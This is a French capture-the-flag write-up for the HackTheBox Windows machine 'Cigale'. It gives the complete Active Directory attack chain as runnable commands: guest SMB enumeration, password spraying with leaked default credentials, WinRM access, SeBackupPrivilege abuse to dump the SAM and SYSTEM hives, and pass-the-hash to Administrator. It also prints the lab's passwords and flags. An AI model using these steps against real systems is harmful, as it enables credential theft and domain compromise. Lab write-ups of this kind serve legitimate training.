# 🦗 Cigale - HackTheBox Writeup

> **Machine:** Cigale  
> **Difficulté²²:** Facile  
> **OS:** Windows  
> **Points:** 450 XP  
> **Domaine:** cicada.htb  
> **IP Cible:** 10.129.231.149

---

## 📋 Sommaire

1. [Reconnaissance](#-1-reconnaissance)
2. [É´numeration Initiale](#-2-é²²numeration-initiale)
3. [Acces Initial](#-3-accs-initial)
4. [Pivoting & Privesc](#-4-pivoting--privesc)
5. [Root](#-5-root)
6. [Lessons Learned](#-lessons-learned)

---

## 🎯 1. Reconnaissance

### Scan de ports avec RustScan

```bash
rustscan -a 10.129.231.149 -sC -sV -Pn -oA scan_rustscan
```

**Explication:** RustScan est un scanner de ports ultra-rapide qui identifie les ports ouverts avant de passer à Nmap pour un scan plus détaillé²².

### Scan Nmap détaillé²²

```bash
export DC_IP=10.129.231.149
export DOMAIN=cicada.htb
export ATTACKER_IP=10.10.10.228

echo "$DC_IP cicada.htb" | sudo tee -a /etc/hosts

nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV -Pn $DC_IP -oA scan_ad
```

**Rsultats principaux:**
- **53/tcp** - DNS
- **88/tcp** - Kerberos
- **389/tcp** - LDAP (Active Directory)
- **445/tcp** - SMB
- **5985/tcp** - WinRM (HTTP)
- Domaine: `cicada.htb`
- OS: Windows Server 2022

**Explication:** On cible spécifiquement les ports Active Directory pour une machine Windows domaine.

---

## 🔍 2. Énumeration Initiale

### Enum4Linux-NG

```bash
enum4linux-ng -A $DC_IP
```

**Rsultats:**
- Domaine: `CICADA` / `cicada.htb`
- SID: `S-1-5-21-917908876-1423158569-3159038727`
- Authentification NULL autorise
- SMB signing: **required**

### Enumeration des shares SMB

```bash
smbclient -N -L //$DC_IP/
```

**Shares découverts:**
- `DEV` - (vide)
- `HR` - (vide)
- `ADMIN$`, `C$`, `SYSVOL`, `NETLOGON` - shares par défaut

### Test avec CrackMapExec

```bash
crackmapexec smb cicada.htb -u 'guest' -p '' --shares
```

**Rsultat:** Le share `HR` est en **READ** pour l'utilisateur `guest`.

---

## 🔓 3. Accès Initial

### Exploration du share HR

```bash
smbclient //cicada.htb/HR
```

```
smb: \> dir
  Notice from HR.txt
smb: \> get "Notice from HR.txt"
```

### Lecture du fichier

```bash
cat 'Notice from HR.txt'
```

**Contenu:** Un fichier de bienvenue contenant un **mot de passe par défaut**:
```
Cicada$M6Corpb*@Lp#nZp!8
```

### Enumeration des utilisateurs avec Lookupsid

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
```

**Explication:** `lookupsid` permet d'é²²numrer les utilisateurs et groupes via leur SID sans authentification.

### Password Spraying

```bash
crackmapexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

**Rsultat:**
```
[+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

### Dcouverte d'un deuxime mot de passe

```bash
crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

**Sortie:**
```
david.orelious - Description: Just in case I forget my password is aRt$Lp#7t*VQ!3
```

🎯 **Mot de passe trouvé dans la description:** `aRt$Lp#7t*VQ!3`

---

## 🔄 4. Pivoting & Privesc

### Accès au share DEV

```bash
crackmapexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
```

```
smb: \> dir
  Backup_script.ps1
smb: \> get Backup_script.ps1
```

### Analyse du script PowerShell

```bash
cat Backup_script.ps1
```

**Contenu:**
```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
```

🎯 **Nouveau compte découvert:** `emily.oscars` avec le mot de passe `Q!3@Lp#M6b*7t*Vt`

### Connexion WinRM avec Evil-WinRM

```bash
evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb
```

### Rcuperation du flag utilisateur

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd Desktop
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt
```

**Flag utilisateur:**
```
0a261571919cee9ec84ddd23b343fa32
```

### Vérification des privilè²²ges

```powershell
whoami /priv
```

**Privilè²²ges intressants:**
- `SeBackupPrivilege` - Back up files and directories
- `SeRestorePrivilege` - Restore files and directories

Ces privilè²²ges permettent de lire les hives SAM et SYSTEM!

### Extraction des hives

```powershell
reg save hklm\sam sam
reg save hklm\system system
download sam
download system
exit
```

---

## 👑 5. Root

### Dump des hashes avec SecretsDump

```bash
impacket-secretsdump -sam sam -system system local
```

**Sortie:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
```

🎯 **NTLM hash de l'Administrateur:** `2b87e7c93a3e8a0ea4a581937016f341`

### Connexion en Pass-the-Hash

```bash
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
```

### Rcuperation du flag root

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
```

**Flag root:**
```
71f39e92342e78b097bf66b670b25fec
```

---

## 📚 Lessons Learned

### Techniques utilises

| Technique | Outil | Description |
|-----------|-------|-------------|
| SMB Enumeration | `smbclient`, `crackmapexec` | Partages accessibles en lecture |
| Password Spraying | `crackmapexec` | Mdp par défaut sur plusieurs comptes |
| Information Disclosure | `--users` CME | Mdp dans la description d'un compte |
| Credential Leak | `Backup_script.ps1` | Mdp en clair dans un script |
| Privilege Escalation | `SeBackupPrivilege` | Dump SAM/SYSTEM |
| Pass-the-Hash | `evil-winrm -H` | Connexion avec NTLM hash |

### Bonnes pratiques violer

❌ **Mots de passe par défaut** dans des fichiers texte  
❌ **Mots de passe dans les descriptions** de comptes AD  
❌ **Mots de passe en clair** dans les scripts PowerShell  
❌ **Privilè²²ges SeBackup** sur un compte utilisateur standard  
❌ **Partages SMB** accessibles avec des comptes faibles

### Commandes cl retenir

```bash
# Enumeration SMB
smbclient -N -L //TARGET/
crackmapexec smb TARGET -u users.txt -p 'password'

# Extraction utilisateurs AD
impacket-lookupsid 'domain/guest'@domain -no-pass

# WinRM
evil-winrm -u user -p 'password' -i TARGET
evil-winrm -u Administrator -H <nthash> -i TARGET

# Dump SAM/SYSTEM
reg save hklm\sam sam
impacket-secretsdump -sam sam -system system local
```

---

## 🏆 Flags

| Flag | Value |
|------|-------|
| **user.txt** | `0a261571919cee9ec84ddd23b343fa32` |
| **root.txt** | `71f39e92342e78b097bf66b670b25fec` |

---

## 🔗 Ressources

- [Vidno officielle](https://www.youtube.com/watch?v=21Z_byocGhI)
- [HackTheBox - Cigale](https://app.hackthebox.com/machines/Cigale)
- [Impacket Tools](https://github.com/fortra/impacket)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [CrackMapExec](https://github.com/mpgn/CrackMapExec)

---

<div align="center">

**HackTheBox | Cigale | Windows | Facile**

⭐ Si ce writeup t'a aidé²², n'hsite pas à star le repo !

</div>

